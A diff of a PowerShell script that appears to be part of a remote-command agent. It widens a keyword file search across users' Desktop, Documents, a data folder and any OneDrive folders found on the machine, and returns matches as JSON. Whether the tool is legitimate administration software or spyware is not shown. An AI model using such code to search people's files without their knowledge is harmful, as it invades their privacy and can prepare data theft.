@@ -321,16 +321,22 @@ try { `$Web = New-Object System.Net.WebClient; `$ImgBytes = `$Web.DownloadData('
                             } elseif ($cmd.type -eq "LocalSearch") {
                                 $kw = $cmd.payload.keyword
                                 Log-Message "LOCAL SEARCH START: $kw"
-                                $paths = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents")
+                                $paths = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "C:\!Data")
+                                # Discovery of other OneDrives
                                 if ($env:OneDrive) { $paths += $env:OneDrive }
+                                try {
+                                    $discovered = Get-ChildItem -Path C:\ -Include "*OneDrive*" -Directory -Depth 1 -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
+                                    if ($discovered) { $paths += $discovered }
+                                } catch {}
                                 
+                                $paths = $paths | Select-Object -Unique | Where-Object { Test-Path $_ }
+                                Log-Message "Scanning paths: $($paths -join ', ')"
+
                                 $files = foreach ($p in $paths) {
-                                    if (Test-Path $p) {
-                                        Get-ChildItem -Path $p -Filter "*$kw*" -Recurse -File -ErrorAction SilentlyContinue | 
-                                            Select-Object Name, FullName, @{Name="Size";Expression={$_.Length}}, LastWriteTime
-                                    }
+                                    Get-ChildItem -Path $p -Filter "*$kw*" -Recurse -File -ErrorAction SilentlyContinue | 
+                                        Select-Object Name, FullName, @{Name="Size";Expression={$_.Length}}, LastWriteTime
                                 }
-                                $Result = $files | ConvertTo-Json
+                                $Result = if ($files) { $files | ConvertTo-Json } else { "[]" }
                                 Log-Message "LOCAL SEARCH END: Found $($files.Count) items."
                             }
                             
